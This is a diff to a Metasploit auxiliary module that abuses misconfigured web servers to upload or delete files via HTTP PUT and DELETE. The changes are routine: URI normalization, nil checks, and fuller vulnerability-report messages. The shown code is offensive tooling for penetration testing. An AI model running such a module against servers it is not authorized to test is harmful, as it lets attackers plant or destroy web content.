@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -21,7 +17,6 @@ class Metasploit4 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'        => 'HTTP Writable Path PUT/DELETE File Access',
-			'Version'     => '$Revision$',
 			'Description'    => %q{
 				This module can abuse misconfigured web servers to upload and delete web content
 				via PUT and DELETE HTTP requests. Set ACTION to either PUT or DELETE.
@@ -124,17 +119,14 @@ class Metasploit4 < Msf::Auxiliary
 	# Main function for the module, duh!
 	#
 	def run_host(ip)
-		path   = datastore['PATH']
+		path   = normalize_uri(datastore['PATH'])
 		data   = datastore['FILEDATA']
 
-		#Add "/" if necessary
-		path = "/#{path}" if path[0,1] != '/'
-		
 		if path[-1,1] != '/'
 			path += '/'
 		end
-		
-		path += datastore['FILENAME']  
+
+		path += datastore['FILENAME']
 
 		case action.name
 		when 'PUT'
@@ -146,17 +138,18 @@ class Metasploit4 < Msf::Auxiliary
 
 			#Upload file
 			res = do_put(path, data)
-			vprint_status("Reply: #{res.code.to_s}")
+			vprint_status("Reply: #{res.code.to_s}") if not res.nil?
 
 			#Check file
 			if not res.nil? and file_exists(path, data)
-				print_good("File uploaded: #{ip}:#{rport}#{path}")
+				turl = "#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}"
+				print_good("File uploaded: #{turl}")
 				report_vuln(
 					:host         => ip,
 					:port         => rport,
 					:proto        => 'tcp',
-					:name         => self.fullname,
-					:info         => "PUT Enabled",
+					:name         => self.name,
+					:info         => "Module #{self.fullname} confirmed write access to #{turl} via PUT",
 					:refs         => self.references,
 					:exploited_at => Time.now.utc
 				)
@@ -176,20 +169,21 @@ class Metasploit4 < Msf::Auxiliary
 
 			#Delete our file
 			res = do_delete(path)
-			vprint_status("Reply: #{res.code.to_s}")
+			vprint_status("Reply: #{res.code.to_s}") if not res.nil?
 
 			#Check if DELETE was successful
 			if res.nil? or file_exists(path, data)
 				print_error("DELETE failed. File is still there.")
 			else
-				print_good("File deleted: #{ip}:#{rport}#{path}")
+				turl = "#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}"
+				print_good("File deleted: #{turl}")
 				report_vuln(
 					:host         => ip,
 					:port         => rport,
 					:proto        => 'tcp',
 					:sname => (ssl ? 'https' : 'http'),
-					:name         => self.fullname,
-					:info         => "DELETE ENABLED",
+					:name         => self.name,
+					:info         => "Module #{self.fullname} confirmed write access to #{turl} via DELETE",
 					:refs         => self.references,
 					:exploited_at => Time.now.utc
 				)
